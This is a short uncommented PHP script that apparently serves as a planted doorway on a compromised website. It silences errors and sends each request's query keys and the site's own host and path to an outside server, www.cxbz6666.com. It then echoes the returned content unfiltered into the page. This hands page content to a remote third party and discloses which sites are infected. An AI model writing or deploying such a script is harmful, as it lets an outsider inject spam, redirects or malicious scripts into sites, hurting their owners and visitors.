<?php
set_time_limit(0);
error_reporting(0);
header("Content-Type: text/html;charset=gb2312");
$www='http://www.cxbz6666.com/';
foreach($_GET as $v => $n){
	$tle.=str_replace("/","^",$v);
}
if($tle!="")
{
$html=@file_get_contents($www.'index.php?tle='.$tle.'&host=http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);
echo $html;
}else
{
$html=@file_get_contents($www.'index.php?tle=8888&host=http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);
echo $html;
}
?>